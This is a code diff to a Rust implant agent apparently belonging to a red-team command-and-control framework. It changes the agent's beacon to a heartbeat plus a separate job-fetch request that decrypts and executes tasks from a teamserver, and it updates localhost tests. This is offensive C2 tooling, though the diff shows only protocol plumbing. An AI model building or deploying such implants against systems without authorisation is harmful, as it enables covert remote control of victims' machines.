@@ -7,7 +7,7 @@ use std::time::Duration;
 use red_cell_common::crypto::{
     AgentCryptoMaterial, derive_session_keys, generate_agent_crypto_material,
 };
-use red_cell_common::demon::DemonCommand;
+use red_cell_common::demon::{DemonCommand, DemonPackage};
 use time::{OffsetDateTime, Time};
 use tracing::{info, warn};
 
@@ -16,7 +16,7 @@ use crate::config::PhantomConfig;
 use crate::error::PhantomError;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, callback_ctr_blocks, parse_init_ack,
-    parse_tasking_response,
+    parse_job_response,
 };
 use crate::transport::HttpTransport;
 
@@ -115,11 +115,17 @@ impl PhantomAgent {
         Ok(())
     }
 
-    /// Send a `COMMAND_CHECKIN` and process the returned task stream.
+    /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
+    /// with a separate `COMMAND_GET_JOB` request.
+    ///
+    /// Mirrors Specter's two-request pattern: the teamserver's `handle_checkin`
+    /// returns no task bytes (always `Ok(None)`), so tasks must be fetched via
+    /// a follow-up `CommandGetJob` call.
     pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
         self.state.poll().await?;
         self.flush_pending_callbacks().await?;
 
+        // Send COMMAND_CHECKIN heartbeat; the server always returns an empty body.
         let packet = build_callback_packet(
             self.agent_id,
             &self.session_crypto,
@@ -128,20 +134,14 @@ impl PhantomAgent {
             0,
             &[],
         )?;
-
-        let response = self.transport.send(&packet).await?;
+        let _response = self.transport.send(&packet).await?;
         self.ctr_offset += callback_ctr_blocks(0);
 
-        let tasking = parse_tasking_response(
-            self.agent_id,
-            &self.session_crypto,
-            self.ctr_offset,
-            &response,
-        )?;
-        self.ctr_offset = tasking.next_ctr_offset;
+        // Fetch queued tasks with a separate COMMAND_GET_JOB request.
+        let packages = self.get_job().await?;
 
         let mut exit_requested = false;
-        for package in tasking.packages {
+        for package in packages {
             execute(&package, &mut self.config, &mut self.state).await?;
             for callback in self.state.drain_callbacks() {
                 let payload = callback.payload()?;
@@ -162,6 +162,31 @@ impl PhantomAgent {
         }
 
         Ok(exit_requested)
+    }
+
+    /// Send a `COMMAND_GET_JOB` and return the decrypted task packages.
+    ///
+    /// The teamserver responds with a raw [`DemonMessage`] byte stream where
+    /// each package payload is individually encrypted at successive monotonic
+    /// CTR offsets — no outer envelope.
+    pub async fn get_job(&mut self) -> Result<Vec<DemonPackage>, PhantomError> {
+        let packet = build_callback_packet(
+            self.agent_id,
+            &self.session_crypto,
+            self.ctr_offset,
+            u32::from(DemonCommand::CommandGetJob),
+            0,
+            &[],
+        )?;
+
+        let response = self.transport.send(&packet).await?;
+        self.ctr_offset += callback_ctr_blocks(0);
+
+        let (packages, next_offset) =
+            parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
+        self.ctr_offset = next_offset;
+
+        Ok(packages)
     }
 
     /// Run the main callback loop until exit conditions are met.
@@ -561,14 +586,103 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn get_job_returns_empty_when_server_sends_nothing()
+    -> Result<(), Box<dyn Error + Send + Sync>> {
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            let (mut stream, _) = listener.accept()?;
+            let _request = read_http_request(&mut stream)?;
+            let body = response_rx.recv()?;
+            write_http_response(&mut stream, &body)?;
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+        agent.ctr_offset = 5;
+        let offset_before = agent.ctr_offset;
+
+        response_tx.send(Vec::new())?;
+
+        let packages = agent.get_job().await?;
+        assert!(packages.is_empty());
+        // CTR must advance by callback_ctr_blocks(0) for the sent packet only.
+        assert_eq!(agent.ctr_offset, offset_before + callback_ctr_blocks(0));
+
+        server.join().map_err(|_| "server thread panicked")??;
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn get_job_decrypts_returned_task_packages() -> Result<(), Box<dyn Error + Send + Sync>> {
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let address = listener.local_addr()?;
+        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
+
+        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
+            let (mut stream, _) = listener.accept()?;
+            let _request = read_http_request(&mut stream)?;
+            let body = response_rx.recv()?;
+            write_http_response(&mut stream, &body)?;
+            Ok(())
+        });
+
+        let config = PhantomConfig {
+            callback_url: format!("http://{address}/"),
+            sleep_delay_ms: 0,
+            ..PhantomConfig::default()
+        };
+        let mut agent = PhantomAgent::new(config)?;
+        // Simulate ctr_offset after init+checkin.
+        agent.ctr_offset = 3;
+        let get_job_send_offset = agent.ctr_offset; // 3
+        let after_send = get_job_send_offset + callback_ctr_blocks(0); // 4
+
+        // Server encrypts the task payload at 'after_send'.
+        let plain_payload = 42_i32.to_le_bytes().to_vec();
+        let enc_payload = encrypt_agent_data_at_offset(
+            &agent.session_crypto.key,
+            &agent.session_crypto.iv,
+            after_send,
+            &plain_payload,
+        )?;
+        let task = DemonPackage {
+            command_id: u32::from(DemonCommand::CommandExit),
+            request_id: 99,
+            payload: enc_payload.clone(),
+        };
+        let get_job_response = DemonMessage::new(vec![task]).to_bytes()?;
+        response_tx.send(get_job_response)?;
+
+        let packages = agent.get_job().await?;
+        assert_eq!(packages.len(), 1);
+        assert_eq!(packages[0].command_id, u32::from(DemonCommand::CommandExit));
+        assert_eq!(packages[0].request_id, 99);
+        assert_eq!(packages[0].payload, plain_payload);
+        // CTR must have advanced: 1 block for send + 1 block for 4-byte payload.
+        assert_eq!(agent.ctr_offset, after_send + ctr_blocks_for_len(enc_payload.len()));
+
+        server.join().map_err(|_| "server thread panicked")??;
+        Ok(())
+    }
+
+    #[tokio::test]
     async fn checkin_processes_exit_task() -> Result<(), Box<dyn Error + Send + Sync>> {
         let listener = TcpListener::bind(("127.0.0.1", 0))?;
         let address = listener.local_addr()?;
         let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
         let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
 
+        // Four connections: init, checkin (empty), get_job (task), exit callback.
         let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
-            for _ in 0..3 {
+            for _ in 0..4 {
                 let (mut stream, _) = listener.accept()?;
                 let request = read_http_request(&mut stream)?;
                 request_tx.send(request)?;
@@ -596,23 +710,35 @@ mod tests {
         assert!(!init_packet.is_empty());
 
         // After init_handshake, ctr_offset == 1.  The agent will:
-        //   1. encrypt checkin at ctr_offset=1, advance by callback_ctr_blocks(0)
-        //   2. decrypt tasking at the new ctr_offset, advance by ctr_blocks_for_len(encrypted_task)
-        //   3. encrypt exit callback at the next ctr_offset, advance by callback_ctr_blocks(4)
+        //   1. encrypt checkin at ctr_offset=1, advance by callback_ctr_blocks(0)   → offset=2
+        //   2. encrypt get_job at ctr_offset=2, advance by callback_ctr_blocks(0)   → offset=3
+        //   3. decrypt task payload at offset=3, advance by ctr_blocks_for_len(4)   → offset=4
+        //   4. encrypt exit callback at ctr_offset=4, advance by callback_ctr_blocks(4) → offset=5
         let checkin_encrypt_offset = agent.ctr_offset; // 1
-        let after_checkin_send = checkin_encrypt_offset + callback_ctr_blocks(0);
-
-        let task = DemonPackage::new(DemonCommand::CommandExit, 7, 9_i32.to_le_bytes().to_vec());
-        let task_message = DemonMessage::new(vec![task]).to_bytes()?;
-        let encrypted_task = encrypt_agent_data_at_offset(
+        let after_checkin_send = checkin_encrypt_offset + callback_ctr_blocks(0); // 2
+        let after_get_job_send = after_checkin_send + callback_ctr_blocks(0); // 3
+        let task_payload = 9_i32.to_le_bytes().to_vec();
+        let encrypted_task_payload = encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            after_checkin_send,
-            &task_message,
+            after_get_job_send,
+            &task_payload,
         )?;
-        let response = DemonEnvelope::new(agent.agent_id, encrypted_task)?.to_bytes();
-        let after_tasking_recv = after_checkin_send + ctr_blocks_for_len(response.len() - 12);
-        response_tx.send(response)?;
+        let after_task_decrypt =
+            after_get_job_send + ctr_blocks_for_len(encrypted_task_payload.len()); // 4
+
+        // Build the raw DemonMessage returned by handle_get_job: each package
+        // payload is individually encrypted; no outer DemonEnvelope.
+        let task = DemonPackage {
+            command_id: u32::from(DemonCommand::CommandExit),
+            request_id: 7,
+            payload: encrypted_task_payload,
+        };
+        let get_job_response = DemonMessage::new(vec![task]).to_bytes()?;
+
+        // checkin → empty; get_job → task; exit callback → empty
+        response_tx.send(Vec::new())?;
+        response_tx.send(get_job_response)?;
         response_tx.send(Vec::new())?;
 
         let exit_requested = agent.checkin().await?;
@@ -623,7 +749,7 @@ mod tests {
         // command_id and request_id are in the clear.
         assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandCheckin).to_be_bytes());
         assert_eq!(&envelope.payload[4..8], &0_u32.to_be_bytes());
-        // Remaining bytes are encrypted: payload_len(4) + payload (empty for checkin).
+        // Remaining bytes are encrypted: payload_len(4) only (empty checkin payload).
         let decrypted = decrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
@@ -631,9 +757,10 @@ mod tests {
             &envelope.payload[8..],
         )?;
         assert_eq!(&decrypted[..4], &0_u32.to_be_bytes());
-        let expected_final_offset = after_tasking_recv + callback_ctr_blocks(4);
+        let expected_final_offset = after_task_decrypt + callback_ctr_blocks(4); // 5
         assert_eq!(agent.ctr_offset, expected_final_offset);
 
+        let _get_job_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         assert!(!exit_callback_packet.is_empty());
 
@@ -650,8 +777,9 @@ mod tests {
         let (request_tx, request_rx) = mpsc::channel::<Vec<u8>>();
         let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();
 
+        // Four connections: init, checkin (empty), get_job (task), exit callback.
         let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
-            for _ in 0..3 {
+            for _ in 0..4 {
                 let (mut stream, _) = listener.accept()?;
                 let request = read_http_request(&mut stream)?;
                 request_tx.send(request)?;
@@ -675,18 +803,27 @@ mod tests {
         )?)?;
 
         // After init: ctr_offset = 1.
-        // Checkin sends at offset 1, advances by callback_ctr_blocks(0).
-        // Task must be encrypted at the offset after the checkin send.
-        let after_checkin_send = 1 + callback_ctr_blocks(0);
-        let task = DemonPackage::new(DemonCommand::CommandExit, 42, 1_i32.to_le_bytes().to_vec());
-        let task_message = DemonMessage::new(vec![task]).to_bytes()?;
-        let encrypted_task = encrypt_agent_data_at_offset(
+        // checkin sends at 1, advances by callback_ctr_blocks(0) → 2.
+        // get_job sends at 2, advances by callback_ctr_blocks(0) → 3.
+        // Task payload is encrypted at offset 3.
+        let after_get_job_send = 1 + callback_ctr_blocks(0) + callback_ctr_blocks(0); // 3
+        let task_payload = 1_i32.to_le_bytes().to_vec();
+        let encrypted_task_payload = encrypt_agent_data_at_offset(
             &agent.session_crypto.key,
             &agent.session_crypto.iv,
-            after_checkin_send,
-            &task_message,
+            after_get_job_send,
+            &task_payload,
         )?;
-        response_tx.send(DemonEnvelope::new(agent.agent_id, encrypted_task)?.to_bytes())?;
+        let task = DemonPackage {
+            command_id: u32::from(DemonCommand::CommandExit),
+            request_id: 42,
+            payload: encrypted_task_payload,
+        };
+        let get_job_response = DemonMessage::new(vec![task]).to_bytes()?;
+
+        // checkin → empty; get_job → task; exit callback → empty
+        response_tx.send(Vec::new())?;
+        response_tx.send(get_job_response)?;
         response_tx.send(Vec::new())?;
 
         agent.run().await?;
@@ -708,6 +845,7 @@ mod tests {
         )?;
         assert_eq!(&decrypted[..4], &0_u32.to_be_bytes());
 
+        let _get_job_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         let exit_callback_packet = request_rx.recv_timeout(std::time::Duration::from_secs(1))?;
         assert!(!exit_callback_packet.is_empty());
 
